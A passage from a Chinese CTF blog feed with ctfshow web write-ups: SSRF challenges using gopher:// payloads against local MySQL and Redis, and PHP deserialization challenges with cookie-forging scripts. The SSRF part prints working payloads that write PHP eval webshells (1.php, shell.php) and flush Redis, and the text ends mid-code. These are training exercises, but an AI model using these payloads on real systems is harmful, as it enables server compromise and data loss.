用不了，贴一个别人的吧：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/<span class="built_in">_</span><span class="comment">%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></span><br></pre></td></tr></table></figure><p>​之后访问 1.php 用 post 传一个 1=system (“cat+/flag.txt”); 即可。</p><h1 id="web360"><a class="markdownIt-Anchor" href="#web360">#</a> web360：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>​这么用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class="line">└─# python2 gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): php</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php eval($_post[1]);?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_post%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it&#x27;s done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure><p>​不知为啥，我的还是用不了，不过，照理来说，发送了之后访问 shell.php 就能 rce 了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web351&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web351&quot;&gt;#&lt;/a&gt; web351：&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-反序列化</title>
    <link href="http://blog.g01den.top/posts/4fb535d6.html"/>
    <id>http://blog.g01den.top/posts/4fb535d6.html</id>
    <published>2024-09-17T12:19:47.000Z</published>
    <updated>2024-12-09T13:37:57.278Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些基础"><a class="markdownIt-Anchor" href="#一些基础">#</a> 一些基础：</h1><blockquote><p>private 变量会被序列化为：\x00 类名 \x00 变量名<br> protected 变量会被序列化为: \x00*\x00 变量名<br> public 变量会被序列化为：变量名</p><p>__sleep ()    // 在对象被序列化之前运行  *</p><p>__wakeup ()   // 将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）  *<br> 如果类中同时定义了 __unserialize () 和 __wakeup () 两个魔术方法， 则只有 __unserialize () 方法会生效，<strong>wakeup () 方法会被忽略。此特性自 PHP 7.4.0 起可用。</strong></p><p>construct () // 当对象被创建时，会触发进行初始化<br>__destruct () // 对象被销毁时触发__toString ()： // 当一个对象被当作字符串使用时触发<br>__call () // 在对象上下文中调用不可访问的方法时触发__callStatic () // 在静态上下文中调用不可访问的方法时触发<br>__get () // 获得一个类的成员变量时调用，用于从不可访问的</p><p>属性读取数据（不可访问的属性包括：1. 属性是私有型。2. 类中不存在的成员变量）<br>__set () // 用于将数据写入不可访问的属性</p><p>__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发<br>__unset () // 在不可访问的属性上使用 unset () 时触发</p><p>__toString () // 把类当作字符串使用时触发<br>__invoke () // 当尝试以调用函数的方式调用一个对象时</p></blockquote><h1 id="web254"><a class="markdownIt-Anchor" href="#web254">#</a> web254</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​这个题就是简单的逻辑，首先是登陆，判断账号密码是否为 xxxxxx，是的话 isVip 则返回 true，之后检测 isVip 是否为 true，是的话就输出 flag。</p><p>​因此，直接 get 传两个参数，username 和 password 都是 xxxxxx 即可出 flag。</p><h1 id="web255"><a class="markdownIt-Anchor" href="#web255">#</a> web255：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​逻辑挺简单的，就是从 cookie 取一个序列化后的字符串，进行反序列化，这个类就实例化成一个对象 user，然后对这个对象进行操作，进行 login，但是 login 只会返回一个真或者假，不会操作 isVip 参数，之后的 checkVip 会检测 isVip 的值，为真则输出 flag，所以，生成的序列化字符串要求是 isVip 属性得是真，所以生成的脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h1 id="web256"><a class="markdownIt-Anchor" href="#web256">#</a> web256：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​这个题在这个函数里有个问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​这里很明显，当账号和密码相等的时候，就不会输出 flag，当不等的时候就输出，所以，需要通过反序列化将 username 或者 password 改一个，使他们不相等，之后 get 传参的时候传入修改之后的就行了。生成 cookie 的脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?username=xxxxxx&amp;password=xxxxx</span><br></pre></td></tr></table></figure><h1 id="web257"><a class="markdownIt-Anchor" href="#web257">#</a> web257：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span 